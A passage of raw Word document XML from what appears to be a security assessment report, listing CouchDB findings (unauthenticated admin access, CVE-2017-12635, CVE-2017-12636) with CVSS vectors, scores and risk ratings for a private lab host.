        <w:t>CouchDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Unauthenticated Administrative Access</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>http://10.10.10.10:5948</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Final Vector:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRPr="002848E4" w:rsidRDefault="007A53C5" w:rsidP="002848E4">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId21" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="002848E4" w:rsidRPr="002848E4">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:color w:val="4F81BD" w:themeColor="accent1"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H/RL:O/RC:X/CR:M/IR:M/AR:L/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRPr="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">CVSS Base Score: </w:t>
      </w:r>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>9.8</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRPr="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Impact </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Subscore</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5.9</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRPr="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Exploitability </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Subscore</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>3.9</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRPr="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">CVSS Temporal Score: </w:t>
      </w:r>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>9.4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRPr="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">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CVSS Environmental Scor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">e: </w:t>
      </w:r>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>9.1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRPr="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Modified Impact </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Subscore</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5.5</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Overall CVSS Score: </w:t>
      </w:r>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>9.1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRPr="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Risk Rating: Critical</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRDefault="002848E4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">3. </w:t>
      </w:r>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>CVE-2017-12635</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>http://10.10.10.10:5948</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Final Vector:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRPr="002848E4" w:rsidRDefault="007A53C5" w:rsidP="002848E4">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId22" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidR="002848E4" w:rsidRPr="002848E4">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:asciiTheme="minorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
            <w:b/>
            <w:color w:val="4F81BD" w:themeColor="accent1"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/RL:O/RC:X/CR:M/IR:M/AR:L/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRPr="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">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Adjusted Scores:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRPr="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">CVSS Base Score: </w:t>
      </w:r>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>9.8</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRPr="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">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Impact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5.9</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRPr="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">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Exploitability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3.9</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRPr="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">CVSS Temporal Score: </w:t>
      </w:r>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>9.1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRPr="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">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CVSS Environmental Score: 8.8</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRPr="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">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Modified Impact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5.5</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Overall CVSS Score: </w:t>
      </w:r>
      <w:r w:rsidRPr="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>8.8</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRPr="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD" w:themeColor="accent1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Risk Rating: High</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRDefault="002848E4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRDefault="008B0AC9" w:rsidP="002848E4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidR="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. CVE-2017-12636</w:t>
      </w:r>
      <w:r w:rsidR="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="002848E4">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:color w:val="4F81BD"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>http://10.10.10.10:5948</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002848E4" w:rsidRDefault="002848E4" w:rsidP="002848E4">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Final Vector:</w:t>
      </w:r>
